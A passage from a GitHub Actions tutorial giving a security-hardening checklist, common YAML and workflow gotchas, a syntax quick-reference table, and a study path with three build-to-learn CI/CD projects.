Caveats: `act` is an *approximation* — it can't perfectly reproduce GitHub-hosted runner images, some `services:`/OIDC/`environment` features behave differently, and certain actions assume the real runner. Use it to catch obvious syntax/logic errors and shell bugs fast; still verify the final pipeline on GitHub. **Never feed `act` your real production secrets** — use throwaway test values.

> **Re-running with debug, in practice:** the UI's "Re-run jobs ▾ → Enable debug logging" toggles `ACTIONS_STEP_DEBUG`/`ACTIONS_RUNNER_DEBUG` for that single re-run without committing anything — the quickest way to get verbose internals on a flaky failure.

---

## 16. Security Hardening (Consolidated)

A single checklist consolidating the security guidance scattered above. Treat your CI as production infrastructure — it holds keys and can ship code.

1. **Least-privilege `GITHUB_TOKEN`** — set `permissions: contents: read` at the workflow level; grant extra scopes (`packages: write`, `id-token: write`, `contents: write`) only on the specific jobs that need them (§9.3). Never `write-all`.
2. **Pin third-party actions to a full commit SHA** — tags are mutable and a supply-chain attack vector; pin to SHA and let **Dependabot** update them (§9.6, §9.8).
3. **Prefer OIDC over stored cloud keys** — no long-lived credentials to leak; short-lived, audited, scoped to repo/branch/environment (§9.7). Same for registries (ECR/GAR/ACR).
4. **Protect secrets** — never echo/transform/log them; pass via `env:`; don't put them in `vars`, artifacts, caches, or outputs; scope prod secrets to a `production` **environment** (§9.1–§9.2, §11).
5. **Never run untrusted PR code with secrets** — understand `pull_request` (no secrets on forks) vs `pull_request_target` (full secrets, must NOT check out/run PR code). Don't build untrusted code with credentials (§3.6).
6. **Launder untrusted input** — PR titles/branch names/commit messages are attacker-controlled; pass through `env:`, never interpolate into `run:` scripts (§9.5).
7. **Harden self-hosted runners** — **never on public repos**; make them **ephemeral**; least-privilege user; restrict network; require approval for first-time contributors (§5.4).
8. **Environment protection** — required reviewers, wait timers, and deployment-branch restrictions gate production deploys; combine with `concurrency` so deploys don't overlap (§11).
9. **Enable Dependabot + secret scanning + push protection** — keep deps/actions patched and block credential leaks at push time (§9.8).
10. **Timeouts everywhere** — `timeout-minutes` on jobs so a stuck/hung step can't run (and bill) indefinitely.

---

## 17. Gotchas & Syntax Reference

### 17.1 Common gotchas **[I/A]**

- ❌ **Tabs in YAML** — YAML forbids tabs for indentation; use **spaces**. A stray tab gives a cryptic parse error.
- ❌ **Forgetting `actions/checkout`** — the runner is *empty*; without checkout your code isn't there, and "file not found" follows.
- ❌ **Expecting jobs to share a filesystem** — they don't; pass *files* via artifacts (§8.2), *values* via job outputs (§6.6).
- ❌ **`paths-ignore` on a required check** — it can leave the check perpetually "expected/pending", blocking merges (§15.3).
- ❌ **`cancel-in-progress: true` on deploys** — can abort a deploy mid-flight; use `false` (queue) for deployment concurrency groups (§11.2).
- ❌ **Adding a custom `if:` and losing the implicit `success()`** — combine `success() && <your condition>` (§6.7).
- ❌ **Mixing `upload-artifact@v4` with `download-artifact@v3`** — incompatible; v3 is shut down (§8.2).
- ❌ **Duplicate artifact names in a matrix** — v4 requires unique names; suffix with `${{ matrix.* }}` (§8.2).
- ❌ **Using the old `::set-output::`/`::set-env::`** — removed; use `$GITHUB_OUTPUT` / `$GITHUB_ENV` (§6.4–§6.5).
- ❌ **`pull_request_target` checking out/running PR code with secrets** — repository compromise (§3.6).
- ❌ **Cron in local time** — cron is **UTC only** (§3.2).
- ❌ **`ubuntu-latest` drifting versions** — pin `ubuntu-24.04` and language versions for reproducibility (§5.2).
- ❌ **Interpolating untrusted input into `run:`** — script injection; launder via `env:` (§9.5).
- ❌ **Scheduled workflows silently disabled** after 60 days of repo inactivity (§3.2).

### 17.2 Syntax quick reference **[I/A]**

| Need | Syntax |
|---|---|
| Run on push to main | `on: { push: { branches: [main] } }` |
| Run on PRs to main | `on: { pull_request: { branches: [main] } }` |
| Manual trigger w/ input | `on: { workflow_dispatch: { inputs: { x: { type: string } } } }` |
| Nightly at 03:00 UTC | `on: { schedule: [{ cron: '0 3 * * *' }] }` |
| Pick runner | `runs-on: ubuntu-latest` |
| Job depends on another | `needs: [build]` |
| Conditional step | `if: github.ref == 'refs/heads/main'` |
| Run even after failure | `if: always()` / `if: failure()` |
| Matrix | `strategy: { matrix: { node: [18,20,22] } }` → `${{ matrix.node }}` |
| Read a secret | `${{ secrets.MY_SECRET }}` |
| Read a config var | `${{ vars.MY_VAR }}` |
| Least-privilege token | `permissions: { contents: read }` |
| Set env for later steps | `echo "K=V" >> "$GITHUB_ENV"` |
| Set a step output | `echo "k=v" >> "$GITHUB_OUTPUT"` → `steps.<id>.outputs.k` |
| Job output → other job | `outputs: { x: ... }` → `needs.<job>.outputs.x` |
| Cache deps (auto) | `setup-node@v4 with: { cache: 'npm' }` |
| Cache (manual) | `actions/cache@v4` with `key:` + `restore-keys:` |
| Upload/download files | `actions/upload-artifact@v4` / `download-artifact@v4` |
| Cancel stale runs | `concurrency: { group: ..., cancel-in-progress: true }` |
| Deployment gate | `environment: { name: production }` |
| OIDC for cloud | `permissions: { id-token: write }` + cloud login action |
| Login to GHCR | `docker/login-action@v3` with `registry: ghcr.io` |
| Default env vars | `GITHUB_SHA`, `GITHUB_REF`, `RUNNER_OS`, `GITHUB_WORKSPACE` |
| Skip CI | put `[skip ci]` in the commit message (or filter with `contains(...)`) |

---

## 18. Study Path & Build-to-Learn Projects

Learn in this order for the fastest path to offline mastery:

1. **Concepts** — CI vs Continuous Delivery vs Continuous Deployment; the six nouns (workflow → event → job → runner → steps → actions) (§1, §2).
2. **Write a first workflow** — checkout + setup-node + `npm ci` + `npm test` on `push` (§2.7).
3. **Triggers** — push/PR with branch & path filters; `workflow_dispatch` inputs; schedule; the `pull_request` vs `pull_request_target` security distinction (§3).
4. **Expressions & data flow** — contexts, `if:`/status functions, `$GITHUB_ENV`, `$GITHUB_OUTPUT`, job outputs (§6).
5. **Orchestrate** — `needs` (DAG), matrix builds, conditional jobs (§7).
6. **Speed it up** — `actions/cache` / built-in caching, artifacts v4 between jobs (§8).
7. **Secure it** — least-privilege `permissions`, pin actions to SHA, never leak secrets, OIDC, Dependabot (§9, §16).
8. **Reuse** — composite actions and reusable workflows; one custom action (§10).
9. **Deploy properly** — environments, required reviewers, concurrency, manual approvals (§11).
10. **Ship real pipelines** — Node (lint→test matrix→Docker→GHCR→deploy) and Go (vet/test→build→release); branch protection (§12–§14).

### Build to learn (do these 3 projects)

1. **CI for a Node/TS app** → a `ci.yml` that, on every push and PR to `main`, checks out, sets up Node 20 with cached deps, runs `lint` + `typecheck` + `test` across a `[18,20,22]` matrix with a Postgres service container, and uploads a coverage artifact. Make the test job a **required status check** so PRs can't merge red. (You built most of this in §12.1.)
2. **Build & publish a Docker image to GHCR** → extend project 1: on pushes to `main` and on `v*` tags, build a multi-stage image with **buildx + GHA layer cache**, tag it by SHA and semver with `docker/metadata-action`, and push to **GHCR** using the least-privilege `GITHUB_TOKEN` (`packages: write`). Confirm the image appears under your repo's Packages. (Cross-reference the Docker guide for the Dockerfile.)
3. **Gated production deploy with keyless auth** → add a `deploy` job that runs **only on `v*` tags**, is attached to a **`production` environment with a required reviewer** (so it pauses for approval), uses a **`deploy-production` concurrency group** (queued, not cancelled), and deploys either to a **VPS over SSH** (`docker compose pull && up -d` behind Nginx) **or** to a cloud via **OIDC** (no stored keys). Add a `workflow_dispatch` **rollback** workflow that redeploys a chosen previous image tag.

> Those three cover ~90% of what real projects ever need: a fast, gated CI that blocks bad merges; a reproducible, cached image build pushed to a registry; and a secure, approvable, rollback-able deploy with least-privilege/keyless credentials. Keep these reflexes in muscle memory: **`permissions: contents: read` by default, pin third-party actions to a SHA, cache your deps, never run untrusted code with secrets, and prefer OIDC over stored keys.**
